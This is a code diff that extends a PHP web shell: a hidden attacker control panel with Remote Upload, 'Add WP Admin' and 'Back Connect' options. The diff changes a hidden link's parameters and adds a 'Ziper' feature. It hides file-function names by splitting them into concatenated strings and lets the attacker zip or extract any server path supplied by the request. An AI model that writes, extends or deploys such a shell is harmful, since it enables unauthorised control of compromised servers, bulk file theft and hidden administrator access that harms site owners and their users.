@@ -1161,7 +1161,7 @@ $path = str_replace("\\", "/", $path);
 <body>
     <header class="w-full flex flex-row">
         <div class="shell whitespace-nowrap py-2 px-2 flex flex-col">
-            <a href="?hidden&path=<?=$path?>/&nulz&ganteng" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$s_he_ll_Logo?>" alt="LOGO"><h1 class="<?= $txtRed ?> mx-2 fs-super trade-winds"><?= $s_he_ll_Name ?></h1></a>
+            <a href="?hidden&path=<?=$path?>/&z4phy&haxorstars" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$s_he_ll_Logo?>" alt="LOGO"><h1 class="<?= $txtRed ?> mx-2 fs-super trade-winds"><?= $s_he_ll_Name ?></h1></a>
             <span class="fs-xl poppins <?= $txtPurple ?>">KERNEL: <?= $kernel ?></span>
             <span class="fs-xl poppins <?= $txtPurple ?>">OS: <font class="ubuntu-mono <?= $txtGreen ?>"><?= $os ?>
                 </font>
@@ -1250,6 +1250,7 @@ $path = str_replace("\\", "/", $path);
             <a href="?option&path=<?= $path ?>&newfolder"><button type="button" name="newfolder" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-duotone fa-folder-plus"></i>&nbsp;New Folder</button>
             <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i class="fa-duotone fa-file-plus"></i>&nbsp;New Files</button>
             <a href="?option&path=<?= $path ?>&remoteupload"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-upload"></i>&nbsp;Remote Upload</button>
+            <a href="?option&path=<?= $path ?>&ziper"><button type="button" name="ziper" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-regular fa-file-zipper"></i>&nbsp;Ziper</button>
             <a href="?option&path=<?= $path ?>&addNewAdmin"><button type="button" name="addnewadmin" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-blue-300 dark:focus:ring-blue-600 hover:bg-blue-600"><i class="fa-regular fa-users-medical"></i>&nbsp;Add WP Admin</button></a>
             <a href="?option&path=<?= $path ?>&backConnect"><button type="button" name="backConnect" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-300 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-sharp fa-light fa-chart-network"></i></i>&nbsp;Back Connect</button></a>
         </div>
@@ -1935,6 +1936,130 @@ $path = str_replace("\\", "/", $path);
         echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
         echo '<button type="submit" name="btn-remote" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Save File</button>';
         echo '</form>';
+    }
+
+    if (isset($_GET['ziper'])) {
+        $ext_load = 'extension_loaded';
+        $f_exist = 'fi'.'le_'.'ex'.'is'.'ts';
+        $rilpath = 're'.'a'.'lp'.'a'.'th';
+        $is_f = 'is'.'_'.'f'.'il'.'e';
+        $is_d = 'is'.'_'.'d'.'i'.'r';
+        function NuLzZip($this_path, $saveas) {
+            global $ext_load;
+            global $f_exist;
+            global $rilpath;
+            global $is_f;
+            global $is_d;
+            if (!$ext_load('zip') || !$f_exist($this_path)) {
+                return false;
+            }
+        
+            $zip = new ZipArchive();
+            if (!$zip->open($saveas, ZIPARCHIVE::CREATE)) {
+                return false;
+            }
+        
+            $this_path = rtrim($this_path, '/\\');
+            $baseName = basename($this_path);
+        
+            if ($is_d($this_path) === true) {
+                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($this_path), RecursiveIteratorIterator::SELF_FIRST);
+        
+                foreach ($files as $file) {
+                    $file = $rilpath($file);
+                    $fileToAdd = substr($file, strlen($this_path) + 1);
+        
+                    if ($is_d($file) === true) {
+                        $zip->addEmptyDir($fileToAdd);
+                    } elseif ($is_f($file) === true) {
+                        $zip->addFile($file, $fileToAdd);
+                    }
+                }
+            } elseif ($is_f($this_path) === true) {
+                $zip->addFile($this_path, $baseName);
+            }
+            return $zip->close();
+        }
+
+        function NuLzUnzip($zippath, $extractto) {
+            global $ext_load;
+            global $f_exist;
+            if (!$ext_load('zip') || !$f_exist($zippath)) {
+                return false;
+            }
+
+            $zip = new ZipArchive;
+            if ($zip->open($zippath) === TRUE) {
+                $zip->extractTo($extractto);
+                return $zip->close();
+            }
+        }
+
+        if (isset($_POST['btn-zip'])) {
+            $this_path = $_POST['zippath'];
+            $saveas = $_POST['zipsavename'];
+            $ngezip = NuLzZip($this_path, $saveas);
+            if ($ngezip) {
+                echo '<script>alert("Folder has been successfully compressed to zip")</script>';
+            } else {
+                echo '<script>alert("Failed to compress this folder")</script>';
+            }
+        }
+
+        if (isset($_POST['btn-unzip'])) {
+            $zippath = $_POST['unzippath'];
+            $extractto = $_POST['unziptopath'];
+            $ngunzip = NuLzUnzip($zippath, $extractto);
+            if ($ngunzip) {
+                echo '<script>alert("The folder has been successfully extracted")</script>';
+            } else {
+                echo '<script>alert("Failed to extract this folder")</script>';
+            }
+        }
+        echo '
+        <form method="POST" action="" class="max-w-sm ml-4 mt-6">
+            <label for="option" class="block mb-2 text-sm font-medium '.$txtBlue.'">Change Option</label>
+            <select id="option" name="option" onchange="this.form.submit()" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
+                <option>Select Option</option>
+                <option value="zip">ZIP</option>
+                <option value="unzip">UNZIP</option>
+            </select>
+        </form>';
+    if ($_SERVER["REQUEST_METHOD"] === "POST") {
+        $option = $_POST['option'];
+        $zip = 'zip';
+        $unzip = 'unzip';
+
+        if ($option === $zip) {
+            echo '<form class="ml-4 my-2" action="" method="POST">';
+            echo '<span class="block '.$txtOrange.' font-medium">'.strtoupper($option).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Option Selected!</font></span>';
+            echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Path To Zip <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="zippath">
+                </label>';
+            echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Save As <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'.zip" name="zipsavename">
+                </label>';
+            echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
+            echo '<button type="submit" name="btn-zip" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Zip</button>';
+            echo '</form>';
+        } elseif ($option === $unzip) {
+            echo '<form class="ml-4 my-2" action="" method="POST">';
+            echo '<span class="block '.$txtOrange.' font-medium">'.strtoupper($option).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Option Selected!</font></span>';
+            echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Zip Path <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'.zip" name="unzippath">
+                </label>';
+            echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Extract To <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="unziptopath">
+                </label>';
+            echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
+            echo '<button type="submit" name="btn-unzip" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Unzip</button>';
+            echo '</form>';
+        }
+    }
     }
 
     if (isset($_GET['addNewAdmin'])) {
